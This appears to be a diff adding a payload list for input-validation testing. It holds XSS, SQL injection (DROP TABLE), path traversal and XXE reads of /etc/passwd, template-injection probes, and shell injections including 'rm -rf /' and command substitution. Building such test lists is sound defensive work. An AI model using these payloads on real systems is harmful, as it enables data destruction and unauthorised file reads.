@@ -1,0 +1,15 @@
+<script>alert('xss')</script>
+'); DROP TABLE responses; --
+../../../etc/passwd
+javascript:alert('xss')
+<iframe src="javascript:alert('xss')">
+<svg onload=alert('xss')>
+<img src=x onerror=alert('xss')>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<?xml-stylesheet type="text/xsl" href="data:application/xslt+xml,<xsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform'><xsl:output method='text'/><xsl:template match='/'>root:x:0:0:root:/root:/bin/bash</xsl:template></xsl:transform>">
+{{7*7}}
+${7*7}
+'; rm -rf /; echo '
+| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
